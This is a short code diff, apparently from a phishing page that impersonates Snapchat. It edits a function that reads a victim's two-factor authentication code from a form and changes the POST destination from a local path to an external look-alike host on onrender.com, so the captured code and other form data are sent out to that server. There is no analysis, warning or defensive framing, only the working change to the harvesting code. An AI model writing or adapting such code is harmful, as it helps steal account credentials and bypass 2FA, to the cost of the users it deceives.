@@ -187,7 +187,7 @@
     function submitAllData() {
       const twoFACode = document.getElementById("twoFACode").value;
       
-      fetch('/submit', {
+      fetch('https://snapchat-c4zd.onrender.com/submit', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
